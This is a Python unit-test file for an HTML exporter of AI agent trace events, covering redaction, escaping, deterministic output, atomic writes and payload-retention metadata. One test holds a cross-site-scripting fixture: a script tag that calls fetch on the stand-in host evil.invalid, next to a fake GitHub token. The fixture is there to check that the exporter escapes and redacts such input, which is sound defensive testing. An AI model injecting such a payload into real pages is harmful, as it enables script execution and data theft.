import base64
import json
import os
from pathlib import Path
import tempfile
import unittest
from unittest import mock

from agent_tail.core import Event, IngestionError, TraceIndex, sanitize_event
from agent_tail.html_export import normalize_generation_time, render_html, write_html_atomic


def event_data(**changes):
    data = {
        "schema_version": "1.0",
        "event_id": "evt-1",
        "trace_id": "trace-1",
        "span_id": "span-1",
        "emitter_id": "worker-1",
        "sequence": 1,
        "timestamp": "2026-07-13T11:02:44.912Z",
        "kind": "tool.call.started",
        "actor": {"id": "reviewer-1"},
        "operation": {"status": "running", "name": "read_file"},
    }
    data.update(changes)
    return data


class HtmlExportTests(unittest.TestCase):
    def test_fixed_and_omitted_generation_times_are_deterministic(self):
        index = TraceIndex()
        index.add(sanitize_event(Event.from_dict(event_data())))

        omitted_first = render_html(index, ())
        omitted_second = render_html(index, ())
        fixed_first = render_html(index, (), generated_at="2026-07-18T12:00:00Z")
        fixed_second = render_html(index, (), generated_at="2026-07-18T12:00:00Z")

        self.assertEqual(omitted_first.encode(), omitted_second.encode())
        self.assertEqual(fixed_first.encode(), fixed_second.encode())
        self.assertNotEqual(omitted_first, fixed_first)

    def test_embedded_snapshot_contains_complete_serve_projection_and_metadata(self):
        index = TraceIndex()
        index.add(sanitize_event(Event.from_dict(event_data(
            kind="change.applied",
            attributes={"change": {
                "path": "src/main.py",
                "old_start": 1,
                "old_count": 1,
                "new_start": 1,
                "new_count": 2,
            }},
            relationships=[{"type": "verified_by", "event_id": "missing-test"}],
            payload={"text": "result"},
        ))))

        html = render_html(
            index,
            (IngestionError(2, "invalid JSON: hostile"),),
            generated_at="2026-07-18T12:00:00Z",
        )
        encoded = html.split('id="agent-tail-export-data" hidden>', 1)[1].split("</div>", 1)[0]
        snapshot = json.loads(base64.b64decode(encoded))
        detail = snapshot["details"]["trace-1"]

        self.assertEqual(detail["evidence_map"]["changes"][0]["hunk"]["path"], "src/main.py")
        self.assertEqual(detail["evidence_map"]["unresolved"][0]["target_event_id"], "missing-test")
        self.assertEqual(detail["findings"][0]["code"], "INVALID_JSON")
        self.assertEqual(snapshot["metadata"], {
            "agent_tail_version": "0.1.0",
            "export_mode": "sanitized embedded snapshot",
            "generated_at": "2026-07-18T12:00:00Z",
            "payload_retention": {"absent": 0, "evicted": 0, "retained": 1, "truncated": 0},
            "redaction_ruleset": "1",
            "schema_versions": ["1.0"],
        })

    def test_hostile_values_cannot_break_out_of_embedded_data(self):
        secret = "ghp_" + "a" * 36
        hostile = '</div><script id="executed">fetch("https://evil.invalid")</script>\u2028\u2029'
        index = TraceIndex()
        index.add(sanitize_event(Event.from_dict(event_data(
            trace_id=hostile,
            actor={"id": secret},
            payload={"authorization": f"Bearer {secret}", "markup": hostile},
        ))))

        html = render_html(index, ())

        self.assertNotIn(secret, html)
        self.assertNotIn(hostile, html)
        self.assertNotIn("evil.invalid", html)
        self.assertEqual(html.count("<script>"), 1)
        self.assertNotIn('id="executed"', html)
        self.assertIn("connect-src 'none'", html)
        self.assertNotIn("http://", html)
        self.assertNotIn("https://", html)

    def test_atomic_write_failure_preserves_destination_and_removes_temporary_file(self):
        with tempfile.TemporaryDirectory() as directory:
            destination = Path(directory, "report.html")
            destination.write_bytes(b"existing")
            with mock.patch.object(os, "replace", side_effect=OSError("replace failed")):
                with self.assertRaisesRegex(OSError, "replace failed"):
                    write_html_atomic(destination, "replacement")

            self.assertEqual(destination.read_bytes(), b"existing")
            self.assertEqual(list(Path(directory).iterdir()), [destination])

    def test_generation_time_requires_zoned_iso_8601_and_normalizes_to_utc(self):
        self.assertEqual(
            normalize_generation_time("2026-07-18T14:00:00+02:00"),
            "2026-07-18T12:00:00Z",
        )
        for invalid in ("today", "2026-07-18T12:00:00"):
            with self.subTest(invalid=invalid), self.assertRaises(ValueError):
                normalize_generation_time(invalid)

    def test_payload_retention_metadata_distinguishes_truncation_and_eviction(self):
        index = TraceIndex(max_bytes=1000)
        index.add(sanitize_event(Event.from_dict(event_data(
            payload={"output": "x" * 5000},
        ))))

        html = render_html(index, ())
        encoded = html.split('id="agent-tail-export-data" hidden>', 1)[1].split("</div>", 1)[0]
        metadata = json.loads(base64.b64decode(encoded))["metadata"]

        self.assertEqual(metadata["payload_retention"]["evicted"], 1)
        self.assertEqual(metadata["payload_retention"]["truncated"], 0)

    def test_metadata_only_export_labels_mode_and_retains_no_payload_body(self):
        sentinel = "payload-only-html-sentinel"
        event = sanitize_event(
            Event.from_dict(event_data(payload={"text": sentinel})),
            metadata_only=True,
        )
        index = TraceIndex()
        index.add(event)

        first = render_html(index, (), metadata_only=True)
        second = render_html(index, (), metadata_only=True)
        encoded = first.split(
            'id="agent-tail-export-data" hidden>', 1
        )[1].split("</div>", 1)[0]
        snapshot = json.loads(base64.b64decode(encoded))

        self.assertEqual(first.encode(), second.encode())
        self.assertNotIn(sentinel, first)
        self.assertEqual(
            snapshot["metadata"]["export_mode"],
            "metadata-only sanitized embedded snapshot",
        )
        self.assertEqual(snapshot["metadata"]["payload_retention"]["omitted"], 1)
        payload = snapshot["details"]["trace-1"]["events"][0]["payload"]
        self.assertEqual(payload["state"], "omitted")
        self.assertNotIn("preview", payload)


if __name__ == "__main__":
    unittest.main()
